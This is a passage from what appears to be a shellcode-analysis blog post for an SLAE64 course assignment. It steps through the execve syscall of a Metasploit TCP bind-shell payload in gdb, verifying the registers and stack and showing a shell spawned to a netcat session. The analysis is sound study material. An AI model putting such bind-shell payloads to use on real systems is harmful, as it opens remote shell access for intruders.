   0x00005555555580a5 <+69>:	mov    rsi,rsp                 <== RSI <- @@ /bin/sh
=> 0x00005555555580a8 <+72>:	syscall 
**_REMOVED_**
End of assembler dump.
(gdb) 
```
Registers values are:
```asm
(gdb) info registers rax rdi rsi rdx
rax            0x3b                59
rdi            0x7fffffffe748      140737488349000
rsi            0x7fffffffe738      140737488348984
rdx            0x0                 0
(gdb) 
```
Let's confirm that RDI and RSI point to the right addresses, and that the stack contains the right data on it:
- RDI points to the string
```asm
(gdb) x/s $rdi                     <== Value of RDI points to the string
0x7fffffffe748:	"/bin/sh"
(gdb) 
```
- RSI points to the address of the stack where the address for the string is
```asm
(gdb) info registers rsi
rsi            0x7fffffffe738      140737488348984   <== Value of RSI
(gdb) x/xg $rsi
0x7fffffffe738:	0x00007fffffffe748              <== Contents of memory pointed by RSI
                                                      == Is the address containing the addres
                                                      == of /bin/sh
(gdb) x/s 0x00007fffffffe748                         <== Points to the string :)
0x7fffffffe748:	"/bin/sh"
(gdb) 
```
- The stack has the expected data on it:
```asm
(gdb) x/3xg $rsi
0x7fffffffe738:	0x00007fffffffe748	0x0000000000000000    <== @@/fin/sh and NULL
0x7fffffffe748:	0x0068732f6e69622f                         <== /bin/sh string
(gdb) 
```
Everything is looking good! Time to `stepi` into the syscall

#### The End Section
Ok, all looks as it was expected. After `stepi` into the syscall, the shell will be spawned in our `netcat` session that we had to open to continue debugging in the previous sections:
```asm
(gdb) stepi
process 1287 is executing new program: /usr/bin/dash
(gdb) 
```
With the expected results:

<img src="https://galminyana.github.io/img/A053_Shellcode_End.png" width="75%" height="75%">

### Thoughts
---
As commented before, the only question from this diseection, is where are the 8 bytes for the **sockaddr** struct that have to be NULL. They haven't been placed into the stack, not making the struct to be properly filled.

After some research, i didnt come with any real conclusion. Just i can assume, that the **bzero** is not really checked by the syscall by the type of connection that's being established.

### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment05) for this assignment contains the following files:

- [Payload_03.c](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Payload_03.c) : The C file cloned from `shellcode.c` to execute the `linux/x64/shell_bind_tcp_random_port` shellcode.
- [Shellcode_03.txt](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Shellcode_03.txt) : The rax shellcode in hex into a text file.



